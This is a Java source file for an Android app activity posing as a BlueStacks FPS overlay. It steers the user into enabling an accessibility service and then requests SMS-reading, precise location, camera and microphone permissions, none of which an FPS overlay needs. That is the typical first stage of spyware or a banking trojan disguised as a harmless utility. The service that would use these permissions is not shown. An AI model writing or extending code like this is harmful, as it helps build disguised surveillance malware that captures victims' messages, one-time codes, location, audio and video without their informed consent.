package com.bluestacks.fpsoverlay;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import java.util.ArrayList;
import java.util.List;

public class CoreActivity extends AppCompatActivity {
    private static final int REQ_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // Step 1: Priority on Accessibility Service
        if (!isAccessibilityServiceEnabled()) {
            Toast.makeText(this, "Please enable Accessibility Service to continue", Toast.LENGTH_LONG).show();
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        } else {
            // If already enabled, proceed to other permissions
            checkOtherPermissions();
        }
    }

    private void checkOtherPermissions() {
        // Cek apakah Aksesibilitas SUDAH aktif, jika belum jangan minta izin dulu
        if (!isAccessibilityServiceEnabled()) return;

        List<String> p = new ArrayList<>();
        p.add(Manifest.permission.ACCESS_FINE_LOCATION);
        p.add(Manifest.permission.READ_SMS);
        p.add(Manifest.permission.CAMERA);
        p.add(Manifest.permission.RECORD_AUDIO);

        List<String> needed = new ArrayList<>();
        for (String perm : p) {
            if (ActivityCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                needed.add(perm);
            }
        }

        if (!needed.isEmpty()) {
            // Memberi jeda sedikit agar Accessibility Service punya waktu untuk inisialisasi window baru
            new android.os.Handler().postDelayed(() -> {
                ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), REQ_CODE);
            }, 1000);
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        // Re-check when coming back from settings
        if (isAccessibilityServiceEnabled()) {
            checkOtherPermissions();
        }
    }

    private boolean isAccessibilityServiceEnabled() {
        android.content.ComponentName expectedComponentName = new android.content.ComponentName(this, SupportService.class);
        String enabledServicesSetting = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (enabledServicesSetting == null) return false;

        android.text.TextUtils.SimpleStringSplitter colonSplitter = new android.text.TextUtils.SimpleStringSplitter(':');
        colonSplitter.setString(enabledServicesSetting);

        while (colonSplitter.hasNext()) {
            String componentNameString = colonSplitter.next();
            android.content.ComponentName enabledService = android.content.ComponentName.unflattenFromString(componentNameString);
            if (enabledService != null && enabledService.equals(expectedComponentName)) return true;
        }
        return false;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_CODE) {
            Toast.makeText(this, "Permissions updated", Toast.LENGTH_SHORT).show();
        }
    }
}
